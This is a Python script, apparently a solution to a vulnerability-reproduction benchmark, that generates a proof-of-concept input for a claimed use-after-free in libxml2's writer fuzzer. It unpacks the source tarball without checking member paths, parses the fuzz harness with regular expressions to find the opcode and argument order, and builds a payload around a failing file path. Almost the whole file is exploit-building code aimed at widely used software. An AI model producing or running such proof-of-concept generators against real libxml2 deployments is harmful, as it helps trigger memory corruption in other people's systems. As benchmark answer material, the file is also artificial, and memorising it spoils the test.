import struct
import tarfile
import os
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Target: libxml2 writer fuzzer (xmlNewTextWriterFilename UAF).
        """
        # Fallback PoC (Minimal XML)
        poc = b"<?xml encoding='UTF-8'?>\n"

        try:
            # Setup extraction path
            extract_dir = "/tmp/libxml2_src"
            if not os.path.exists(extract_dir):
                os.makedirs(extract_dir)

            # Extract source to find fuzzer harness
            if tarfile.is_tarfile(src_path):
                with tarfile.open(src_path) as tar:
                    tar.extractall(path=extract_dir)
            
            # Locate fuzz/writer.c
            writer_c_path = None
            for root, dirs, files in os.walk(extract_dir):
                if "writer.c" in files and "fuzz" in root:
                    writer_c_path = os.path.join(root, "writer.c")
                    break
            
            if writer_c_path:
                with open(writer_c_path, "r") as f:
                    content = f.read()

                # Find the opcode for xmlNewTextWriterFilename
                # Look for 'case N: ... xmlNewTextWriterFilename ...'
                # Use regex to find the case number
                cases = re.findall(r'case\s+(\d+)\s*:(.*?)(?:break;|return)', content, re.DOTALL)
                
                target_op = None
                block_content = ""
                for op_str, block in cases:
                    if "xmlNewTextWriterFilename" in block:
                        target_op = int(op_str)
                        block_content = block
                        break
                
                if target_op is not None:
                    # Determined opcode. Now determine argument order.
                    # We need to supply a URI that fails (to trigger double free) and a valid encoding.
                    uri = b"///" # Directory, fails to open for writing
                    encoding = b"UTF-8"
                    
                    # Heuristic to detect order of xmlFuzzReadString calls
                    # Finds all assignments like 'var = xmlFuzzReadString'
                    # Then checks usage in xmlNewTextWriterFilename(arg1, ..., arg3)
                    
                    reads = re.findall(r'(\w+)\s*=\s*xmlFuzzReadString', block_content)
                    
                    # Find arguments passed to xmlNewTextWriterFilename
                    # Pattern: xmlNewTextWriterFilename(arg1, arg2, arg3)
                    call_match = re.search(r'xmlNewTextWriterFilename\s*\(\s*([^,]+),[^,]*,\s*([^,\)]+)', block_content)
                    
                    first_str_is_uri = True # Default assumption
                    
                    if call_match and len(reads) >= 2:
                        arg1_var = call_match.group(1).strip()
                        arg3_var = call_match.group(2).strip()
                        
                        # If the first variable read is used as arg3 (encoding), then encoding is first.
                        if reads[0] == arg3_var:
                            first_str_is_uri = False
                        elif reads[0] == arg1_var:
                            first_str_is_uri = True
                    
                    # Construct payload
                    payload = bytearray()
                    payload.append(target_op)
                    
                    if first_str_is_uri:
                        # URI then Encoding
                        payload.extend(struct.pack('<I', len(uri)))
                        payload.extend(uri)
                        payload.extend(struct.pack('<I', len(encoding)))
                        payload.extend(encoding)
                    else:
                        # Encoding then URI
                        payload.extend(struct.pack('<I', len(encoding)))
                        payload.extend(encoding)
                        payload.extend(struct.pack('<I', len(uri)))
                        payload.extend(uri)
                        
                    return bytes(payload)

        except Exception:
            pass
        
        return poc